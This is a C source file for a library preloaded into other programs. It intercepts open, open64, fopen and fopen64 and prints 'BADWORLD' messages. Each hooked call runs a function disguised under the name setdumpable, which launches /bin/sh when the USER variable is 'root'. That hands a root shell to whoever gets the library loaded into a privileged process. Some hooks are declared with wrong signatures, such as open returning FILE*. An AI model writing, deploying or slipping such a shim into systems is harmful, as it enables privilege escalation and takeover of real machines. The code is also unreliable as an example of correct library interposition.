#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
/* #include <sys/prctl.h> */


void setdumpable() {
    int s;
    int u;
    char *args[2];
    args[0] = "/bin/sh";
    /* args[1] = "-l"; */
    args[1] = NULL;
    if (strcmp(getenv("USER"), "root") == 0) {
        u = execvp(args[0], args);
    } else {
        printf("My user is: %s\n", getenv("USER"));
    }
    /* s = prctl(4, 1); */
/*    s = prctl(PR_SET_DUMPABLE, 1, NULL, NULL, NULL); */
}
FILE* open(const char* path, const char* mode) {
    setdumpable();
    printf("BADWORLD Opening %s\n", path);
    FILE* (*real_open)(const char*, const char*) =
        dlsym(RTLD_NEXT, "open");
    return real_open(path, mode);
}
FILE* open64(const char* path, const char* mode) {
    setdumpable();
    printf("BADWORLD Opening %s\n", path);
    FILE* (*real_open64)(const char*, const char*) =
        dlsym(RTLD_NEXT, "open64");
    return real_open64(path, mode);
}
FILE* fopen(const char* path, const char* mode) {
    setdumpable();
    printf("FBADWORLD Opening %s\n", path);
    FILE* (*real_fopen)(const char*, const char*) =
        dlsym(RTLD_NEXT, "fopen");
    return real_fopen(path, mode);
}
FILE * fopen64 (const char *path, const char *opentype) {
    setdumpable();
    printf("FBADWORLD64 Opening %s\n", path);
    FILE* (*real_fopen64)(const char*, const char*) =
        dlsym(RTLD_NEXT, "fopen64");
    return real_fopen64(path, opentype);
}
